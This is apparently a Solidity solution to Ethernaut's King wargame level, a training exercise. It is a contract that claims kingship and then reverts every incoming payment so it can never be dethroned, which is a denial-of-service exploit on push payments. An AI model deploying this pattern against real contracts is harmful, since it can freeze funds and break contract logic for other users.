// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// contract to attack ethernaut's King challenge
// basically just don't have any fallback/receipt function
// or revert with the fallback, as I did for a snarky retort
contract Attacking {
    address victim = address(0x00C5f4170F0b22094ee440Cc567E52Bedaab14B1);
    
    // Create a malicious contract and seed it with some Ethers
    constructor () {

    }
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() public payable {
        (bool success, ) = victim.call{value: msg.value}('');
        require(success, "failed to become king");
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    fallback() external payable {
        revert("forever pwnd");
    }
}